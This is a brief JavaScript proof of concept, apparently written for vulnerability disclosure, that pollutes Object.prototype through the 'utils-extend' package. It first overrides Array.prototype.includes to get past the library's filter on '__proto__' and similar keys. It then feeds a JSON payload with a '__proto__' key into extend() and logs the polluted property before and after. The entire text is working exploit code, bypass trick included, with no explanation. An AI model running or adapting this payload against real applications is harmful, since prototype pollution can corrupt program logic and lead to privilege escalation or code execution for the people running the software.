Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const {extend} = require('utils-extend');
const payload = '{"__proto__":{"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
const pollutionObject = JSON.parse(payload);
extend({}, pollutionObject);
console.log({}.polluted);